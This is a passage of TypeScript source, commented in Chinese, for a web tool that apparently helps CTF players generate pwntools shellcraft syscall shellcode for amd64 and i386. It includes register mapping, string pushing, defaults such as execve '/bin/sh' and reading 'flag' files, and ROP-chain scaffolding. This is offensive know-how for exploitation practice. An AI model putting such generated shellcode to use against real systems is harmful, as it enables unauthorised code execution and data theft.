function isLenName(n: string, sysName: string){ n=(n||"").toLowerCase(); if(/vlen|nr_segs|liovcnt|riovcnt|sigsetsize|sizemask|gidsetsize|initval|nfds|nsops|nsems|nr_|maxevents/.test(n)) return false; if((sysName==="eventfd"||sysName==="eventfd2") && n==="count") return false; if((sysName==="clone3"||sysName==="openat2"||sysName==="epoll_create"||sysName==="bpf") && n==="size") return false; return /count|len|size|bufsiz|nbytes|msgsz/.test(n); }
function computePrevLen(){
  for(var k=chain.length-1;k>=0;k--){ var s=chain[k]; if(!s||s.isSave||!s.vals) continue;
    var so=(arch==="i386" ? SYS.find(function(x){return x.name===s.name;})||SYS64.find(function(x){return x.name===s.name;}) : SYS64.find(function(x){return x.name===s.name;})||SYS.find(function(x){return x.name===s.name;})); if(!so) continue;
    for(var j=0;j<so.args.length;j++){ if(isLenName(argName(so.args[j]), so.name) && s.vals[j] && parseNum(s.vals[j])!==null) return {val:s.vals[j], from:s.name}; }
  }
  return {val:lastLenValue, from:"上一步 read/mmap（示例）"};
}
function $<K extends keyof UiElements>(id: K): UiElements[K];
function $(id: string): HTMLElement;
function $(id: string): HTMLElement {
  const element = document.getElementById(id);
  if (!element) throw new Error("Missing UI element: " + id);
  return element;
}
function input(id: string): HTMLInputElement {
  // Used only for dynamic IDs belonging to the ROP input fields.
  return $(id) as HTMLInputElement;
}
var q=$("q"), suggest=$("suggest");

var QUICK=["write","read","open","openat","mmap","mprotect","sendfile","chmod","mkdir","unlink","execve","exit"];
$("quick").innerHTML=QUICK.map(function(n){return '<button data-q="'+n+'">'+n+'</button>';}).join("");
$("quick").addEventListener("click",function(e){var b=(e.target as Element | null)?.closest<HTMLButtonElement>("button");if(b?.dataset.q)selectByName(b.dataset.q);});

function fmtVal(v: string){
  v=(v||"").trim(); if(!v) return "0";
  var unq=v.replace(/^'|'$/g,"");
  if(REGNAMES.indexOf(unq)>=0){
    if(arch==="i386" && REGMAP32[unq]) return "'"+REGMAP32[unq]+"'";
    return "'"+unq+"'";
  }
  return v;
}
// asm 预览只认十进制 / 0x 十六进制立即数：shellcraft 代码里合法的 Python 八进制 0o777 在汇编里是非法的，
// 这里单独转十进制。只转 0o 形式，0x / 十进制 / 寄存器原样不动；常量速查表里的 0o777 显示本身没错，不动它。
function asmVal(v: string){
  var f=fmtVal(v).replace(/'/g,"");
  if(/^0o[0-7]+$/i.test(f.trim())) return String(parseNum(f));
  return f;
}
// pwntools SYS_ 常量名对照（A-D1/A-D2，buildCode 是唯一用名生成处）：
// A-D1：i386 的 19 个 *32 调用在 pwntools 里叫 SYS_<名>32（如 SYS_getuid32），本页显示名去掉了 32 后缀，
//   直接拼 'SYS_getuid' 会拿到旧 16 位版的号（24）；select(142) 在 pwntools 里是 SYS__newselect。只在 i386 下改名，amd64 不动。
// A-D2：这些调用在 pwntools 里没有 SYS_ 常量，发名字会让 asm() 报错，改发数字 sys.nr（与汇编预览 L1617 用的号一致）。
//   同名不同号的调用按架构分表（如 pread64：amd64=17，i386=180；timerfd_create：amd64=283，i386=322），不要只按名查一张表。
var SYS32_SUFFIX32=["lchown","getuid","getgid","geteuid","getegid","setreuid","setregid","getgroups","setgroups","fchown","setresuid","getresuid","setresgid","getresgid","chown","setuid","setgid","setfsuid","setfsgid"];
var NO_SYS_CONST={
 amd64:["pread64","pwrite64","timerfd_create","uretprobe","uprobe","close_range","faccessat2","process_madvise","epoll_pwait2","mount_setattr","quotactl_fd","landlock_create_ruleset","landlock_add_rule","landlock_restrict_self","memfd_secret","process_mrelease","futex_waitv","set_mempolicy_home_node","cachestat","fchmodat2","map_shadow_stack","futex_wake","futex_wait","futex_requeue","statmount","listmount","lsm_get_self_attr","lsm_set_self_attr","lsm_list_modules","mseal","setxattrat","getxattrat","listxattrat","removexattrat","open_tree_attr","file_getattr","file_setattr","listns","rseq_slice_yield","fchroot"],
 i386:["restart_syscall","oldselect","pread64","pwrite64","kexec_load","timerfd_create","statx","arch_prctl","io_pgetevents","rseq","close_range","faccessat2","process_madvise","epoll_pwait2","mount_setattr","quotactl_fd","landlock_create_ruleset","landlock_add_rule","landlock_restrict_self","memfd_secret","process_mrelease","futex_waitv","set_mempolicy_home_node","cachestat","fchmodat2","map_shadow_stack","futex_wake","futex_wait","futex_requeue","statmount","listmount","lsm_get_self_attr","lsm_set_self_attr","lsm_list_modules","mseal","setxattrat","getxattrat","listxattrat","removexattrat","open_tree_attr","file_getattr","file_setattr","listns","rseq_slice_yield","fchroot"]
};
function sysHead(sys: Syscall){
  if(arch==="i386"){
    if(sys.name==="select") return "'SYS__newselect'";
    if(SYS32_SUFFIX32.indexOf(sys.name)>=0) return "'SYS_"+sys.name+"32'";
    if(NO_SYS_CONST.i386.indexOf(sys.name)>=0) return String(sys.nr);
  }else if(NO_SYS_CONST.amd64.indexOf(sys.name)>=0) return String(sys.nr);
  return "'SYS_"+sys.name+"'";
}
function buildCode(sys: Syscall, vals: string[]){
  var parts=vals.map(fmtVal);
  var head=sysHead(sys);
  var body=parts.length?head+", "+parts.join(", "):head;
  return "sc += "+archPath()+".syscall(\n    "+body+"\n)";
}
// 文件名参数的位置：所有路径类调用（open/chmod/mkdir/unlink…）的文件名都是字符串指针，
// 生成时自动在前面加 pushstr，文件名参数传 'rsp'。值 = 该参数下标。
var STRARG: Record<string, number> ={open:0,openat:1,execve:0,execveat:1,openat2:1,chmod:0,fchmodat:1,fchmodat2:1,chown:0,lchown:0,mkdir:0,mkdirat:1,mknod:0,mknodat:1,creat:0,unlink:0,unlinkat:1,rmdir:0,chdir:0,access:0,faccessat:1,faccessat2:1,stat:0,lstat:0,statfs:0,truncate:0,truncate64:0,readlink:0,readlinkat:1,newfstatat:1,mq_open:0,mq_unlink:0,chroot:0,acct:0,utime:0,utimes:0,swapon:0,swapoff:0,umount:0,umount2:0,mount:0,delete_module:0,fsopen:0,memfd_create:0,inotify_add_watch:1,fchownat:1,futimesat:1,utimensat:1,name_to_handle_at:1,statx:1,open_tree:1,fspick:1,mount_setattr:1,open_tree_attr:1,file_getattr:1,file_setattr:1,setxattr:0,lsetxattr:0,getxattr:0,lgetxattr:0,listxattr:0,llistxattr:0,removexattr:0,lremovexattr:0,fsetxattr:1,fgetxattr:1,fremovexattr:1,setxattrat:1,getxattrat:1,listxattrat:1,removexattrat:1,fanotify_mark:4,finit_module:1,quotactl:1,sethostname:0,setdomainname:0,fsconfig:2,init_module:2,kexec_file_load:3};
var STRDEF: Record<string, string> ={execve:"/bin/sh",execveat:"/bin/sh",sethostname:"myhost",setdomainname:"mydomain",fsconfig:"source",init_module:"",kexec_file_load:""};
// 两个文件名字符串的调用：a=第一个（传 'rsp'），b=第二个（先 pushstr 后 mov r13, rsp 保存，传 'r13'）
var STR2: Record<string, {a: number; b: number}> ={rename:{a:0,b:1},link:{a:0,b:1},symlink:{a:0,b:1},renameat:{a:1,b:3},renameat2:{a:1,b:3},linkat:{a:1,b:3},symlinkat:{a:0,b:2},pivot_root:{a:0,b:1},move_mount:{a:1,b:3}};
// 多个字符串参数、但不在 STR2 里的调用：idx = 字符串参数下标（顺序和上面的字符串框一一对应），def = 每个框的默认值。
// 第 1 个传 'rsp'，第 2 个先 pushstr 后 mov r13 保存，第 3 个先 pushstr 后 mov r14 保存——每个字符串都单独压，不能共用一个 'rsp'。
var STR_MULTI: Record<string, MultiString> ={
 mount:{idx:[0,1,2],def:["tmpfs","/mnt/target","tmpfs"]},
 setxattr:{idx:[0,1],def:["flag","user.myattr"]}, lsetxattr:{idx:[0,1],def:["flag","user.myattr"]},
 getxattr:{idx:[0,1],def:["flag","user.myattr"]}, lgetxattr:{idx:[0,1],def:["flag","user.myattr"]},
 removexattr:{idx:[0,1],def:["flag","user.myattr"]}, lremovexattr:{idx:[0,1],def:["flag","user.myattr"]},
 setxattrat:{idx:[1,3],def:["flag","user.myattr"]}, getxattrat:{idx:[1,3],def:["flag","user.myattr"]}, removexattrat:{idx:[1,3],def:["flag","user.myattr"]},
 add_key:{idx:[0,1],def:["user","mykey"]},
 request_key:{idx:[0,1,2],def:["user","mykey",""]}
};
function strMultiRegs(sys: Syscall){ var r: (string | null)[]=[]; for(var k=0;k<3;k++){ var c=multiCanon(sys,k); r.push(c? "'"+c+"'" : null); } return r; }
var STR2DEF: Record<string, string[]> ={rename:["flag","flag.bak"],link:["flag","flag_hard"],symlink:["flag","flag_link"],renameat:["flag","flag.bak"],renameat2:["flag","flag.bak"],linkat:["flag","flag_hard"],symlinkat:["flag","flag_link"],pivot_root:["/newroot","oldroot"],move_mount:["flag","/mnt/target"]};
function escStr(s: string){return s.replace(/\\/g,"\\\\").replace(/'/g,"\\'");}
// i386 的 mount：5 个参数占了 ebx/ecx/edx/esi/edi，只剩 ebp 一个空闲寄存器，两个保存位不够用。
// 不走 shellcraft.syscall（它内部 mov 的顺序没法保证不覆盖），改成手动 mov：dir 也要存时 type 先暂存 edi、dir 存 ebp，
// 先把 type 从 edi 搬进 edx，之后 edi 才轮到放 data；dir 留空时 type 直接存 ebp——顺序写死在生成结果里，不依赖 pwntools 的寄存器调度。
function mountManual32(sys: Syscall, vals: string[], strs: string[], use: boolean[]){
  var flagsRaw=fmtVal(vals[3]).replace(/'/g,""), dataRaw=fmtVal(vals[4]).replace(/'/g,"");
  // flags/data 的值本身就在「读到它之前会被先写掉」的寄存器里时，晚搬会读到错的值：
  // flags 在倒数第二步才读，那时 edx（type）、ecx（dir_name）、ebx（dev_name）都已赋值，edi/ebp/eax/esp 也被暂存和 pushstr 动过；
  // data 最后才读，比 flags 还多一个 esi（flags 就写进 esi）。旧判定只查 edi/ebp/eax/esp，ebx/ecx/edx/esi 全部漏掉、静默出错。
  // 不再静默退回普通生成——在所有 pushstr/暂存之前先把冲突的值搬走。data 先搬（它可能要读 esi，而 flags 的提前搬运会写 esi），
  // flags 再搬进 esi（esi 在这之前没人动）；data 若走 edi 暂存位（dir 也要存时）则先暂存 eax（eax 只在最后放调用号，之前没人动），
  // 等 type 搬进 edx、edi 空出来后再从 eax 搬回 edi。
  // 顺序反过来会错：flags 的源正好是 data 的暂存目标时，flags 必须先搬；两者互相抢（flags 源 = data 暂存目标，且 data 源 = esi）
  // 时一次 xchg 同时换好两个值。
  var flagsBad=/^(edi|ebp|eax|esp|ebx|ecx|edx)$/.test(flagsRaw);
  var dataBad=/^(edi|ebp|eax|esp|ebx|ecx|edx|esi)$/.test(dataRaw);
  var lines: string[]=[];
  var dDest=use[1] ? "eax" : "edi";
  var cycle=flagsBad && dataBad && flagsRaw===dDest && dataRaw==="esi";
  if(cycle){
    lines.push("sc += 'xchg esi, "+dDest+"\\n'  # flags 与 data 的值正好互为对方的暂存目标：一次 xchg 同时换好，esi 得 flags、"+dDest+" 得 data");
  } else {
    if(flagsBad && flagsRaw===dDest) lines.push("sc += 'mov esi, "+(flagsRaw||"0")+"\\n'  # flags 先搬进 esi：它的值在 "+flagsRaw+" 里，晚搬会被暂存步骤覆盖");
    if(dataBad && !use[1]) lines.push("sc += 'mov edi, "+(dataRaw||"0")+"\\n'  # data 先搬进 edi：它的值在 "+dataRaw+" 里，晚搬会被暂存步骤覆盖（dir 不存时 edi 空闲）");
    else if(dataBad) lines.push("sc += 'mov eax, "+(dataRaw||"0")+"\\n'  # data 先暂存 eax：它的值在 "+dataRaw+" 里，晚搬会被暂存步骤覆盖；eax 只在最后放调用号");
    if(flagsBad && flagsRaw!==dDest) lines.push("sc += 'mov esi, "+(flagsRaw||"0")+"\\n'  # flags 先搬进 esi：它的值在 "+flagsRaw+" 里，晚搬会被暂存步骤覆盖");
  }
  var temp2=use[1] ? "edi" : "ebp"; // type 的暂存：dir 也要存时用 edi（之后先搬进 edx 再放 data），dir 不存时直接用 ebp
  if(use[2]){ lines.push("sc += shellcraft.pushstr('"+escStr(strs[2])+"')"); lines.push("sc += 'mov "+temp2+", esp\\n'  # 暂存 type 指针"); }
  if(use[1]){ lines.push("sc += shellcraft.pushstr('"+escStr(strs[1])+"')"); lines.push("sc += 'mov ebp, esp\\n'  # 保存 dir_name 指针（mount 用不到 ebp）"); }
  if(use[0]) lines.push("sc += shellcraft.pushstr('"+escStr(strs[0])+"')");
  lines.push("sc += 'mov edx, "+(use[2]?temp2:"0")+"\\n'  # type（先搬走，edi 下面要放 data）");
  if(dataBad && use[1]) lines.push("sc += 'mov edi, eax\\n'  # data（从 eax 搬回来，edi 此时已空出）");
  lines.push("sc += 'mov ecx, "+(use[1]?"ebp":"0")+"\\n'  # dir_name");
  lines.push("sc += 'mov ebx, "+(use[0]?"esp":"0")+"\\n'  # dev_name");
  if(!flagsBad) lines.push("sc += 'mov esi, "+(flagsRaw||"0")+"\\n'  # flags");
  if(!dataBad) lines.push("sc += 'mov edi, "+(dataRaw||"0")+"\\n'  # data");
  lines.push("sc += 'mov eax, "+sys.nr+"\\n'");
  lines.push("sc += 'int 0x80\\n'");
  return lines.join("\n");
}
function buildFullCode(sys: Syscall, vals: string[]){
  var code=buildCode(sys, vals);
  var multi=STR_MULTI[sys.name];
  if(multi){
    var strs=[($("strInput").value||"").trim(),($("strInput2").value||"").trim(),($("strInput3")?($("strInput3").value||"").trim():"")];
    var vals2=vals.slice(), use: boolean[]=[];
    for(var k=0;k<multi.idx.length;k++){
      var canon=multiCanon(sys,k);
      if(!strs[k]){
        use[k]=false;
        // 空字符串：参数还是自动值（空 / 0 / 保存寄存器）时才传 0，不连累其它字符串的 pushstr；
        // 用户手动改成了别的寄存器/值就原样保留——旧逻辑无条件写 0，会把用户填的寄存器静默丢掉（口径与 STR2、单字符串一致）。
        var rawV=vals[multi.idx[k]];
        if(rawV==="" || fmtVal(rawV)==="0" || (canon && fmtVal(rawV)==="'"+physOf(canon)+"'")) vals2[multi.idx[k]]="0";
      }
      else if(canon && (fmtVal(vals[multi.idx[k]])==="'"+physOf(canon)+"'" || vals[multi.idx[k]]==="" || fmtVal(vals[multi.idx[k]])==="0")){
        // 字符串框填了、参数框还是空/0（默认没预填，或用户清空了）：自动用保存寄存器（或 6 参数 i386 下的最终寄存器）补上，
        // 不能静默丢掉这个字符串。用户明确改成别的寄存器时才走手动处理。
        vals2[multi.idx[k]]="'"+physOf(canon)+"'"; use[k]=true;
      }
      else use[k]=false; // 用户改成了别的寄存器：这个字符串手动处理，其余照常自动压
    }
    if(arch==="i386" && sys.name==="mount" && use[2] && (!strs[1] || use[1]) && (use[0]||!strs[0])){
      var man=mountManual32(sys, vals, strs, use);
      if(man) return man;
    }
    var lines: string[]=[];
    for(var m=multi.idx.length-1;m>=1;m--){
      if(!use[m]) continue;
      lines.push("sc += shellcraft.pushstr('"+escStr(strs[m])+"')");
      const savedCanon = multiCanon(sys,m);
      if (!savedCanon) throw new Error("No register available for string argument " + m);
      lines.push("sc += 'mov "+physOf(savedCanon)+", "+spReg()+"\\n'");
    }
    if(use[0]) lines.push("sc += shellcraft.pushstr('"+escStr(strs[0])+"')");
    if(!lines.length) return buildCode(sys, vals2);
    return lines.join("\n")+"\n"+buildCode(sys, vals2);
  }
  var two=STR2[sys.name];
  if(two){
    var s1=($("strInput").value||"").trim(), s2=($("strInput2").value||"").trim();
    var savePhys=physOf(str2Canon(sys)), vals3=vals.slice();
    var useA=!!s1 && (fmtVal(vals[two.a])==="'"+spReg()+"'" || vals[two.a]==="" || fmtVal(vals[two.a])==="0");
    var useB=!!s2 && (fmtVal(vals[two.b])==="'"+savePhys+"'" || vals[two.b]==="" || fmtVal(vals[two.b])==="0");
    if(useA) vals3[two.a]="'"+spReg()+"'";
    if(useB) vals3[two.b]="'"+savePhys+"'";
    // 和多字符串一样逐个处理：某个框留空 = 只有那个参数传 0（参数还是自动值时；手动改成别的寄存器时保留那个寄存器），另一个照常 pushstr。
    // 旧逻辑是任一为空就整段丢掉 pushstr、参数却还留着 'rsp'/保存寄存器，会传错指针（如 rename 把文件重命名到自身还返回 0）。
    if(!s1 && fmtVal(vals[two.a])==="'"+spReg()+"'") vals3[two.a]="0";
    if(!s2 && fmtVal(vals[two.b])==="'"+savePhys+"'") vals3[two.b]="0";
    var lines2: string[]=[];
    if(useB){ lines2.push("sc += shellcraft.pushstr('"+escStr(s2)+"')"); lines2.push("sc += 'mov "+savePhys+", "+spReg()+"\\n'"); }
    if(useA) lines2.push("sc += shellcraft.pushstr('"+escStr(s1)+"')");
    if(!lines2.length) return buildCode(sys, vals3);
    return lines2.join("\n")+"\n"+buildCode(sys, vals3);
  }
  var idx=STRARG[sys.name];
  if(idx===undefined) return code;
  var sv=($("strInput").value||"").trim();
  if(!sv){
    // 框留空 = 这个字符串参数传 0（参数还是自动值 'rsp' 时；手动改成别的寄存器时保留那个寄存器。如 init_module 的 uargs、kexec_file_load 的 cmdline_ptr 本来就常为空），不再留个 'rsp' 指着没压栈的位置
    if(fmtVal(vals[idx])==="'"+spReg()+"'"){ var v0=vals.slice(); v0[idx]="0"; return buildCode(sys, v0); }
    return code;
  }
  if(fmtVal(vals[idx])!=="'"+spReg()+"'" && vals[idx]!=="" && fmtVal(vals[idx])!=="0") return code;
  // 字符串框填了、参数框还是空/0：自动把参数补成 rsp/esp 再 pushstr，不能静默丢掉字符串；明确改成别的寄存器时才走手动处理
  var vv=vals.slice();
  if(fmtVal(vv[idx])!=="'"+spReg()+"'") vv[idx]="'"+spReg()+"'";
  return "sc += shellcraft.pushstr('"+escStr(sv)+"')\n"+buildCode(sys, vv);
}
function currentVals(): string[] { return Array.from(document.querySelectorAll<HTMLInputElement>(".arg-input"), i => i.value); }

function select(sys: Syscall){
  const hadSelection = cur !== null;
  cur=sys; q.value=sys.name; suggest.classList.remove("open");
  $("detailCard").style.display="block";
  $("sysName").textContent=sys.name;
  $("sysNr").textContent="NR "+sys.nr+" · 0x"+sys.nr.toString(16);
  $("sysProto").textContent=sys.name+"("+sys.args.join(", ")+")"+(sys.args.length?"":" — 无参数");
  $("regMap").innerHTML="<span><b>"+axReg()+"</b> = "+sys.nr+" (SYS_"+sys.name+")</span>"+sys.args.map(function(a,i){return "<span>ARG"+i+" <b>"+REGS[i]+"</b> = "+argName(a)+"</span>";}).join("");
  var warn=$("warnBox");
  if(STR_MULTI[sys.name]){
    warn.textContent=archText("这个调用有 "+STR_MULTI[sys.name].idx.length+" 个字符串参数，每个都要单独 pushstr，不能共用一个 'rsp'，更不能只压第一个：生成顺序是先 pushstr 最后一个字符串并 mov 保存，最后 pushstr 第一个字符串传 'rsp'。每个字符串改上面对应的框，某个框留空 = 那个参数直接传 0（参数手动改成别的寄存器时按那个寄存器传），不影响其它字符串；把任一字符串参数改成别的寄存器时，那个字符串的 pushstr 会自动去掉，要自己保证字符串已经在那个地址。")+(arch==="i386" ? (sys.name==="mount" ? "i386 特别说明：mount 有 5 个参数，只剩 ebp 一个空闲寄存器，两个保存位不够——本页改走手动 mov 顺序生成（dir 填了时：type 先暂存 edi、搬进 edx 之后 edi 才放 data，dir 存 ebp；dir 留空时：type 直接存 ebp），不经 shellcraft.syscall，不依赖它内部 mov 的顺序。另外手动路径里 dev/dir/type 三个指针只由字符串框构造：框留空就是传 0，参数框手改的寄存器不会保留（和上面通用说法不同）。" : "i386 特别说明：保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）——比如 setxattr 的 flags 占着 edi，就改存 ebp，不会再被 flags 的赋值覆盖；mount 的 data 占 ebp 的情况同理。6 参数调用（如 setxattrat/getxattrat）没有空闲寄存器时，字符串直接进它自己的最终参数寄存器（name 进 esi），不另找保存寄存器。") : "");
    warn.classList.add("show");
  } else if(STR2[sys.name]){
    warn.textContent=archText("这个调用有两个文件名参数，都是指针，不能直填字符串。生成顺序是：先 pushstr 第二个名字（新名）并 mov "+str2Canon(sys)+", rsp 保存，再 pushstr 第一个名字（旧名）传 'rsp'。两个名字分别改上面两个框，某个框留空 = 只有那个参数传 0（参数手动改成别的寄存器时按那个寄存器传），另一个照常 pushstr（旧版任一为空会把两个都丢掉、参数还指着没压栈的位置）；把任一参数改成别的寄存器时，pushstr 会自动去掉，那种情况要自己保证字符串已经在那个地址。")+(arch==="i386" ? archText("i386 的保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）：renameat2/linkat/move_mount 的 flags 占着 edi，所以存 ebp，不会被覆盖。") : "");
    warn.classList.add("show");
  } else if(STRARG[sys.name]!==undefined){
    warn.textContent=archText("文件名参数是指针，不能把字符串直接填进 syscall，更不是长度。下面生成的代码会自动先 pushstr 上面填的字符串、再传 'rsp'，复制和加到链里都带这行；想换文件名改上面那个框。把上面框留空 = 这个参数传 0（参数手动改成别的寄存器时按那个寄存器传；init_module 的参数串、kexec_file_load 的命令行这类本来就常为空）。把文件名参数改成别的寄存器时，pushstr 那行会自动去掉（那种情况要自己保证字符串已经在那个地址）。");
    warn.classList.add("show");
  } else warn.classList.remove("show");
  if(cur.name==="socketcall" && arch==="i386"){
    warn.textContent="i386 特别说明（已核对）：老内核没有独立的 socket/bind/connect 系统调用，全部经 socketcall(102) 多路复用：第一个参数 call 是子调用号（见 ARG0 的提示），第二个参数是指向参数数组的指针。amd64 上这些是独立调用，别把 amd64 的 socket 号搬到 i386。";
    warn.classList.add("show");
  } else if(cur.name==="mmap2"){
    warn.textContent="i386 特别说明：mmap(90) 是接收结构体指针的旧 ABI；这里的 mmap2(192) 直接接收六个参数，最后一个 pgoff 以 4096 字节为单位：从文件开头映射填 0，从 0x2000 字节处映射填 2。";
    warn.classList.add("show");
  } else if(cur.name==="ipc" && arch==="i386"){
    warn.textContent="i386 说明：ipc(117) 是 SysV IPC 的多路复用入口，第一个参数 call 是子调用号（SEMGET=2 / MSGGET=13 / SHMGET=23，完整表见 ARG0 的提示），后面的参数随子调用变。新内核（5.1+）也有独立的 semget(393) / msgget(399) / shmget(395) 等号，可以直接搜名字用独立号，不必走 ipc。";
    warn.classList.add("show");
  } else if(cur.name==="mmap" && arch==="i386"){
    warn.textContent="i386 特别说明（已核对）：i386 的 mmap(90) 和 amd64 完全不一样——它只有一个参数，指向栈上一个 6 字段结构体 mmap_arg_struct（addr, len, prot, flags, fd, offset，每个 4 字节），不是 amd64 的 6 个寄存器参数。先按倒序在栈上压好这 6 个值，再把参数填 'esp'；本页默认已填 'esp'，别改成 0。要用 amd64 那种六参数写法，i386 请改用 mmap2(192)。";
    warn.classList.add("show");
  } else if(cur.name==="clone" && arch==="i386"){
    warn.textContent="i386 特别说明（已核对）：clone 的参数顺序和 amd64 不同——i386 是 clone_flags / newsp / parent_tidptr / tls / child_tidptr（tls 第 4 个、child_tidptr 第 5 个），与 amd64 正好相反（amd64 是 child_tidptr 第 4 个、tls 第 5 个）。本页已按 i386 顺序收录，别再按 amd64 的顺序往寄存器里搬。";
    warn.classList.add("show");
  }
  var sb=$("strBox"), sb2=$("strBox2"), sb3=$("strBox3");
  if(STR_MULTI[sys.name]){
    var mm=STR_MULTI[sys.name], regs2=strMultiRegs(sys);
    sb.style.display="block"; sb2.style.display="block"; sb3.style.display=mm.idx.length>=3?"block":"none";
    $("strInput").value=mm.def[0]||""; $("strInput2").value=mm.def[1]||""; if(mm.idx.length>=3) $("strInput3").value=mm.def[2]||"";
    $("strLabel").textContent=archText("第一个字符串 · "+argName(sys.args[mm.idx[0]])+"（生成时自动 pushstr 压栈，这个参数传 'rsp'）");
    $("strLabel2").textContent=archText("第二个字符串 · "+argName(sys.args[mm.idx[1]])+"（先 pushstr 再 mov "+(regs2[1]?regs2[1].replace(/'/g,""):"r13")+", rsp 保存，这个参数传 "+(regs2[1]||"'r13'")+"）");
    if(mm.idx.length>=3) $("strLabel3").textContent=archText("第三个字符串 · "+argName(sys.args[mm.idx[2]])+"（先 pushstr 再 mov "+(regs2[2]?regs2[2].replace(/'/g,""):"r14")+", rsp 保存，这个参数传 "+(regs2[2]||"'r14'")+"）"+(arch==="i386"&&sys.name==="mount"?"；i386 下这是暂存寄存器，生成时走手动 mov 顺序（dir 留空时 type 改存 ebp，以生成代码为准）":""));
  }
  else if(STR2[sys.name]){sb.style.display="block";sb2.style.display="block";sb3.style.display="none";var dd=STR2DEF[sys.name]||["flag","flag2"];$("strInput").value=dd[0];$("strInput2").value=dd[1];
    $("strLabel").textContent=archText("文件名字符串（生成时自动 pushstr 压栈，文件名参数传 'rsp'）");
    $("strLabel2").textContent=archText("第二个文件名字符串（新名字：先 pushstr 再 mov "+str2Canon(sys)+", rsp 保存，第二个文件名参数传 '"+str2Canon(sys)+"'）");}
  else if(STRARG[sys.name]!==undefined){sb.style.display="block";sb2.style.display="none";sb3.style.display="none";$("strInput").value=(sys.name in STRDEF)?STRDEF[sys.name]:"flag";
    $("strLabel").textContent=archText("文件名字符串（生成时自动 pushstr 压栈，文件名参数传 'rsp'）");}
  else {sb.style.display="none";sb2.style.display="none";sb3.style.display="none";}
  var box=$("argsBox");
  if(!sys.args.length){box.innerHTML='<p class="empty">这个调用没有参数，直接生成即可。</p>';}
  else box.innerHTML=sys.args.map(function(a,i){
    var an=argName(a), at=argType(a);
    var h=(HINTS[arch+":"+sys.name+":"+an]||HINTS[sys.name+":"+an]||genericHint(sys.name,an,at));
    var chips=(h[2]||[]).map(function(c){return '<button data-v="'+c+'">'+archText(c)+'</button>';}).join("");
    var lenSrc="";
    if(h[0]==="len"){
      var pv=computePrevLen();
      lenSrc='<div class="len-src"><p class="ls-title">这个长度从哪来？三选一（点按钮直接填）</p>'
        +'<div class="ls-row">1）跟上一步一样：<button data-lenmode="same" data-v="'+pv.val+'">填 '+pv.val+'</button><span>上一步 '+pv.from+' 用的就是这个长度，两步要对齐时选它（如 read 读 0x100，write 就写 0x100）</span></div>'
        +'<div class="ls-row">2）用上一步返回值：<button data-lenmode="rax" data-v="rax">填 \''+axReg()+'\'</button><span>意思是上一步实际得到多少就用多少：如 read 把实际读到的字节数放在 '+axReg()+' 里，write 填 \''+axReg()+'\' 就写那么多，不用猜 flag 到底多长。前提：上一步是 read 这类把字节数放进 '+axReg()+' 的调用</span></div>'
        +'<div class="ls-row">3）已知固定长度：<span>直接在上面框里自己填数字，要写/读的数据有几个字节就填几。例：写 5 字节字符串 hello 就填 5，写 3 字节就填 3，读一页就填 0x1000</span></div></div>';
    }
    var autoSrc="";
    var anL=an.toLowerCase();
    if(/fd|fildes/.test(anL) && anL!=="dfd" && !/fds$/.test(anL) && at.indexOf("*")<0){ // 带 * 的是指针参数（如 pipe 的 fildes 是输出数组地址），不是 fd 编号，不给“fd 从哪来”面板
      autoSrc='<div class="len-src"><p class="ls-title">这个 fd（编号）从哪来？点一个直接填，不用看说明</p>'
        +'<div class="ls-row">操作终端/屏幕：<button data-autofill="0">0 · 键盘输入</button><button data-autofill="1">1 · 屏幕输出</button><button data-autofill="2">2 · 报错输出</button><span>这三个是系统定死的：0=stdin 输入，1=stdout 输出，2=stderr 报错</span></div>'
        +'<div class="ls-row">操作刚打开的文件：<button data-autofill="rax">填 \''+axReg()+'\'</button><span>上一步 open/openat 打开文件后，fd 就放在 '+axReg()+' 里。前提：中间没插别的系统调用，不然 '+axReg()+' 已经被改掉了</span></div>'
        +'<div class="ls-row">文件是更早打开的：<button data-autofill="r12">填保存的寄存器</button><span>当时如果先 mov 保存过（例：mov '+(arch==="i386"?"esi":"r12")+', '+axReg()+'），就填那个寄存器；没保存过又跑了别的调用，这个 fd 已经找不回来了，要在链里那一步后面补一步保存</span></div></div>';
    } else if(h[0]==="vec"){
      autoSrc='<div class="len-src"><p class="ls-title">自动化搭法：先在栈上搭好这张小表格，vec 再填表格地址</p>'
        +'<div class="ls-row"><span>表格每行 '+(arch==="i386"?"8":"16")+' 字节：第 1 格 = 数据的地址，第 2 格 = 数据有多少字节。内核照着表格去读写。直接把数据地址填给 vec 是错的——内核会把你的数据前 '+(arch==="i386"?"8":"16")+' 字节当成表格来读。</span></div>'
        +'<pre>; 例：数据在 '+axReg()+' 里（上一步 mmap 返回的地址），长度 0x100 字节\npush 0x100   ; 先压第 2 格：长度\npush '+axReg()+'     ; 再压第 1 格：数据地址\n; 压完 '+spReg()+' 正好指向这张表格</pre>'
        +'<div class="ls-row"><button data-autofill="rsp">按这个搭法：vec 填 \''+spReg()+'\'</button><span>上面两行 push 写在 syscall 那行前面；数据不在 '+axReg()+' 里，就把第二行 push 的换成你的数据地址，长度按你的数据改</span></div></div>';
    } else if(h[0]==="cnt"){
      autoSrc='<div class="len-src"><p class="ls-title">这个数是「有几个」，不是字节数！点一个直接填</p>'
        +'<div class="ls-row"><button data-autofill="1">1 · 只有 1 个（最常见）</button><button data-autofill="2">2 · 两个</button><button data-autofill="3">3 · 三个</button><span>指向的数组/表格里有几个元素就填几（如 iovec 表格搭了几行、poll 的 ufds 数组里有几个 pollfd、sembuf 数组里有几个操作），必须一一对应；和数据有多少字节没关系</span></div></div>';
    }
    return '<div class="arg-row"><div class="arg-top"><span class="reg-badge">ARG'+i+" · "+REGS[i]+'</span><span class="aname">'+an+'</span><span class="atype">'+at+'</span><span class="src-badge '+h[0]+'">'+SRC_LABEL[h[0]]+'</span></div><label class="sr-only" for="arg-'+i+'">ARG'+i+' '+an+'</label><input type="text" id="arg-'+i+'" class="arg-input" data-i="'+i+'" placeholder="数值或寄存器，如 0x100 / '+axReg()+'" autocomplete="off" autocapitalize="off" spellcheck="false">'+(chips?'<div class="arg-chips">'+chips+"</div>":"")+'<details class="arg-help"><summary>参数说明与填值参考</summary><p class="arg-hint">'+archText(h[1])+'</p>'+lenSrc+autoSrc+'</details></div>';
  }).join("");
  // 默认示例值
